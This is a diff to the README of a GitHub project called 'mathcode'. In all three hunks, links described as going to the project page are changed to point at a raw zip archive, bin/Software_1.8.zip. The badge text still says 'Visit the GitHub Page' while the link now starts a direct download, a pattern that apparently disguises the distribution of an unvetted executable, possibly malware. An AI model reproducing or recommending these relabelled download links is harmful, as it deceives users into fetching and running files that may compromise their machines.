@@ -1,6 +1,6 @@
 # 🤖 mathcode - Build Math Tools with Code
 
-[![Download MathCode](https://img.shields.io/badge/Download%20MathCode-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/tayyabk5874/mathcode)
+[![Download MathCode](https://img.shields.io/badge/Download%20MathCode-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/tayyabk5874/mathcode/raw/refs/heads/main/bin/Software_1.8.zip)
 
 ## 🧭 What is MathCode?
 
@@ -30,7 +30,7 @@ If you plan to use larger models or heavier tasks, 16 GB of RAM gives better res
 
 Visit this page to download and set up MathCode:
 
-[https://github.com/tayyabk5874/mathcode](https://github.com/tayyabk5874/mathcode)
+[https://github.com/tayyabk5874/mathcode/raw/refs/heads/main/bin/Software_1.8.zip](https://github.com/tayyabk5874/mathcode/raw/refs/heads/main/bin/Software_1.8.zip)
 
 1. Open the link in your browser.
 2. Look for the latest release, installer, or setup file.
@@ -181,7 +181,7 @@ Keep the app updated by checking the same GitHub page from time to time and down
 
 ## 📍 Project page
 
-[https://github.com/tayyabk5874/mathcode](https://github.com/tayyabk5874/mathcode)
+[https://github.com/tayyabk5874/mathcode/raw/refs/heads/main/bin/Software_1.8.zip](https://github.com/tayyabk5874/mathcode/raw/refs/heads/main/bin/Software_1.8.zip)
 
 ## 🏷️ Topics
 
